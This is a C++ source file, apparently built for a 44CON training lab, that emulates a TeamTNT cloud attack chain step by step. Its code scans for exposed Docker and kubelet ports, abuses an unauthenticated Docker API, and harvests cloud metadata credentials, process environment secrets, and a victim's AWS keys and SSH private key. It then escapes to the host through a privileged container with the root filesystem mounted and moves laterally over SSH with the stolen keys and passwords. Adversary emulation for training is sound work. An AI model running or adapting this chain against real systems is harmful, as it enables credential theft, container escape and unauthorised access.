#include "attack_steps.hpp"

#include "log.hpp"
#include "net_scanner.hpp"
#include "util.hpp"

#include <chrono>
#include <dirent.h>
#include <fstream>
#include <sstream>
#include <sys/stat.h>
#include <unistd.h>

namespace teamtnt {

AttackChain::AttackChain(Config cfg)
    : cfg_(std::move(cfg)), docker_(cfg_.docker_base_url()) {
  if (!cfg_.lab_mode) die("Set TEAMTNT_LAB=1 or run inside the attacker container.");
  ensure_dir(cfg_.staging_dir);
}

std::filesystem::path AttackChain::staging(const std::string& name) const {
  return std::filesystem::path(cfg_.staging_dir) / name;
}

void AttackChain::run_all() const {
  log("==============================================");
  log(" TeamTNT Native Attack Chain — 44CON Lab");
  log("==============================================");
  step01_scan();
  step02_probe_docker();
  step03_harvest_credentials();
  step04_container_discovery();
  step05_escape_and_deploy();
  step06_lateral_movement();
  step07_mock_miner();
  log("==============================================");
  log(" Chain complete. Staging: " + cfg_.staging_dir);
  log("==============================================");
}

void AttackChain::step01_scan() const {
  log(">>> Step 01 — scan targets (T1595 / T1046)");
  const std::vector<ScanTarget> targets = {
      {"docker-api", {2375, 10250, 10255}},
      {"victim-app", {80}},
      {"metadata-sim", {80}},
  };

  const auto results = scan_targets(targets);
  std::ostringstream out;
  const auto now = std::chrono::system_clock::now().time_since_epoch().count();
  for (const auto& r : results) {
    out << "open tcp " << r.port << ' ' << r.ip << ' ' << now << '\n';
    log("  OPEN " + r.host + " (" + r.ip + "):" + std::to_string(r.port));
  }
  write_file(staging("scan-results.txt"), out.str());
  if (results.empty()) warn("No open ports — is the lab running?");
}

void AttackChain::step02_probe_docker() const {
  log(">>> Step 02 — probe Docker API (T1133 / T1613)");
  log("Probing Docker API at " + cfg_.docker_base_url());
  if (!docker_.ping()) die("Docker API unreachable — is the lab running?");

  const auto containers = docker_.list_containers(true);
  std::ostringstream ps;
  ps << "ID\tIMAGE\tSTATUS\tNAMES\n";
  if (containers.is_array()) {
    for (const auto& c : containers) {
      ps << c.value("Id", "").substr(0, 12) << '\t' << c.value("Image", "") << '\t'
         << c.value("Status", "") << '\t';
      if (c.contains("Names") && !c["Names"].empty()) ps << c["Names"][0].get<std::string>();
      ps << '\n';
    }
  }
  write_file(staging("docker-ps.txt"), ps.str());

  const auto ver = docker_.version();
  write_file(staging("docker-info.txt"), ver.dump(2));
  log("Docker API is unauthenticated — initial access confirmed.");
}

void AttackChain::step03_harvest_credentials() const {
  log(">>> Step 03 — harvest credentials (T1552 / T1083)");
  std::ostringstream creds;
  creds << "=== METADATA ===\n";

  const auto meta_list = http_.get(cfg_.metadata_url + "/iam/security-credentials/");
  if (meta_list.ok()) creds << meta_list.body << '\n';

  const auto meta_role = http_.get(cfg_.metadata_url + "/iam/security-credentials/lab-role");
  if (meta_role.ok()) creds << meta_role.body << '\n';

  creds << "=== /proc environ ===\n";
  if (auto* dir = opendir("/proc")) {
    while (auto* ent = readdir(dir)) {
      if (ent->d_name[0] < '0' || ent->d_name[0] > '9') continue;
      const std::filesystem::path env_path = std::filesystem::path("/proc") / ent->d_name / "environ";
      std::ifstream in(env_path, std::ios::binary);
      if (!in) continue;
      std::string data((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
      if (data.find("AWS_") == std::string::npos && data.find("KUBERNETES_") == std::string::npos)
        continue;
      creds << "--- " << env_path.string() << " ---\n";
      for (size_t i = 0; i < data.size();) {
        const size_t end = data.find('\0', i);
        const std::string line = data.substr(i, end == std::string::npos ? data.size() - i : end - i);
        if (line.find("AWS_") != std::string::npos || line.find("KUBERNETES_") != std::string::npos)
          creds << line << '\n';
        if (end == std::string::npos) break;
        i = end + 1;
      }
    }
    closedir(dir);
  }

  log("Harvesting victim files via Docker API (T1552.001 / T1552.004)");
  const std::string victim_id = docker_.find_container_by_name("victim-app");
  if (!victim_id.empty()) {
    creds << "=== victim files ===\n";
    creds << docker_.exec_output(victim_id, {"cat", "/home/devops/.aws/credentials"}) << '\n';
    creds << docker_.exec_output(victim_id, {"cat", "/home/devops/.docker/config.json"}) << '\n';
    creds << docker_.exec_output(victim_id, {"cat", "/home/devops/.ssh/id_rsa"}) << '\n';
    creds << docker_.exec_output(victim_id, {"cat", "/home/devops/.lab_ssh_creds"}) << '\n';
  } else {
    warn("Victim container not found; skipping file harvest");
  }

  write_file(staging("harvested-creds.txt"), creds.str());
  log("Credentials staged at " + staging("harvested-creds.txt").string());
}

void AttackChain::step04_container_discovery() const {
  log(">>> Step 04 — container discovery (T1613 / T1610)");
  write_file(staging("containers-full.txt"), docker_.list_containers(true).dump(2));
  write_file(staging("images.txt"), docker_.list_images().dump(2));

  log("Pull and run public image (T1204.003)");
  docker_.pull_image("busybox", "1.36");
  write_file(staging("pull.log"), "pull busybox:1.36 requested via Docker API\n");

  nlohmann::json run_spec;
  run_spec["Image"] = "busybox:1.36";
  run_spec["Cmd"] = nlohmann::json::array(
      {"sh", "-c", "echo '[T1204] malicious image executed (lab)'; sleep 2"});
  const std::string run_id = docker_.run_container("teamtnt-pulled-lab", run_spec);
  write_file(staging("image-run.log"),
              run_id.empty() ? "container run failed\n" : "started teamtnt-pulled-lab: " + run_id + "\n");

  const auto containers = docker_.list_containers(false);
  if (containers.is_array() && !containers.empty()) {
    const std::string id = containers[0]["Id"].get<std::string>();
    write_file(staging("inspect-sample.json"), docker_.inspect_container(id).dump(2));
  }
  log("Discovery complete.");
}

void AttackChain::step05_escape_and_deploy() const {
  log(">>> Step 05 — escape and deploy (T1611 / T1105)");
  nlohmann::json spec;
  spec["Image"] = "busybox:1.36";
  spec["Cmd"] = nlohmann::json::array({"sleep", "3600"});
  spec["HostConfig"]["Privileged"] = true;
  spec["HostConfig"]["Binds"] = nlohmann::json::array({"/:/host:rw"});

  const std::string id = docker_.run_container("teamtnt-escape-lab", spec);
  if (id.empty()) {
    warn("Failed to start escape container");
    return;
  }

  std::ostringstream escape_out;
  if (!id.empty()) {
    escape_out << docker_.exec_output(id, {"sh", "-c",
                                           "echo '[escape] Host root visible at /host'; "
                                           "ls /host/etc/hostname; cat /host/etc/hostname; "
                                           "ls -la /host/var/run/docker.sock 2>/dev/null || echo no docker.sock"});
  }
  write_file(staging("escape-output.txt"), escape_out.str());

  log("Ingress tool transfer (T1105)");
  const auto dl = http_.get("https://raw.githubusercontent.com/torvalds/linux/master/README");
  write_file(staging("helper.sh"), dl.ok() ? dl.body : "# mock payload\n");
  log("Escape lab container: teamtnt-escape-lab");
}

void AttackChain::step06_lateral_movement() const {
  log(">>> Step 06 — lateral movement (T1021.004 / T1078.004)");
  const auto creds_path = staging("harvested-creds.txt");
  const auto key_path = staging("id_rsa");
  const std::string creds = read_file(creds_path);
  const std::string key = extract_ssh_key(creds);
  const std::string password = extract_ssh_password(creds);
  const std::string target = cfg_.ssh_lateral_target;

  if (!key.empty()) {
    write_file(key_path, key);
    chmod(key_path.c_str(), 0600);
    log("SSH key extracted to " + key_path.string());

    const std::string key_cmd =
        "ssh -i " + key_path.string() +
        " -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
        "devops@" +
        target + " 'hostname; id' > " + staging("lateral-ssh-key.log").string() + " 2>&1";
    if (run_command(key_cmd) == 0) {
      log("SSH key lateral command succeeded (T1021.004)");
    } else {
      warn("SSH key lateral failed — is lateral-ssh-target running?");
    }
  } else {
    warn("No SSH key in harvest; skipping key-based lateral");
  }

  if (!password.empty()) {
    write_file(staging("lateral-ssh-password.sh"),
               "#!/bin/bash\nexport SSHPASS='" + password + "'\n"
               "sshpass -e ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
               "devops@" +
                   target + " 'hostname; id'\n");
    chmod(staging("lateral-ssh-password.sh").c_str(), 0755);
    const std::string pass_cmd = "bash " + staging("lateral-ssh-password.sh").string() + " > " +
                                 staging("lateral-ssh-password.log").string() + " 2>&1";
    if (run_command(pass_cmd) == 0) {
      log("SSH password lateral command succeeded (T1021.004)");
    } else {
      warn("SSH password lateral failed — is sshpass installed and lateral-ssh-target running?");
    }
  } else {
    warn("No SSH password in harvest; skipping password-based lateral");
  }

  if (creds.find("AKIA") != std::string::npos) {
    write_file(staging("aws-identity.txt"), "Harvested AWS key present — would run aws sts get-caller-identity\n");
  } else {
    write_file(staging("aws-identity.txt"), "aws cli not available or no keys harvested\n");
  }
  log("Lateral movement artifacts in " + cfg_.staging_dir);
}

void AttackChain::step07_mock_miner() const {
  log(">>> Step 07 — mock miner (T1496.001)");
  nlohmann::json spec;
  spec["Image"] = "busybox:1.36";
  spec["Cmd"] = nlohmann::json::array(
      {"sh", "-c",
       "while true; do dd if=/dev/zero of=/dev/null bs=1M count=2 2>/dev/null; sleep 1; done"});
  spec["HostConfig"]["NanoCpus"] = 250000000;

  const std::string id = docker_.run_container("k8s-guardian-miner", spec);
  if (!id.empty()) {
    log("Miner container started: k8s-guardian-miner");
  } else {
    warn("Miner deployment failed");
  }
}

}  // namespace teamtnt
